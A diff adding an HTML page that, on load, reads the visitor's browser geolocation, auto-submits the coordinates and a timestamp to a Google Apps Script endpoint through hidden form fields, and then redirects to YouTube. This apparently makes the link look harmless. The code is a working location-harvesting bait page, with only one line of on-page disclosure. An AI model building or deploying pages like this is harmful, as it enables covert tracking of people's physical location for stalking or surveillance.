@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<p>Your coordinates will be sent automatically.</p>
+
+<form id="locationForm" method="POST" action="https://script.google.com/macros/s/AKfycbyVeSNYSx-fN2jD_Ybbk0kCVpJSNpaTOGMuqJli8RJ9vfXbxz3q2a3FtUvC4zVZgaAL/exec">
+  <input id="date" name="Date" type="hidden">
+  <input id="latitude" name="Latitude" type="hidden">
+  <input id="longitude" name="Longitude" type="hidden">
+</form>
+
+<script>
+window.onload = function() {
+  getLocation();
+};
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const now = new Date();
+      document.getElementById('date').value = now.toISOString();
+      document.getElementById('latitude').value = position.coords.latitude;
+      document.getElementById('longitude').value = position.coords.longitude;
+
+      // Attempt to submit the form automatically
+      document.getElementById('locationForm').submit();
+
+      // Wait for 4 seconds to hope that the form has been submitted before redirecting
+      setTimeout(function() {
+        window.location.replace("http://stackoverflow.com/SpecificAction.php");
+        window.location.href = "https://youtube.com";
+      }, 2500); // Delay for 4 seconds
+    }, function(error) {
+      alert("Error getting location: " + error.message);
+    });
+  } else { 
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+</script>
+
+</body>
+</html>
+
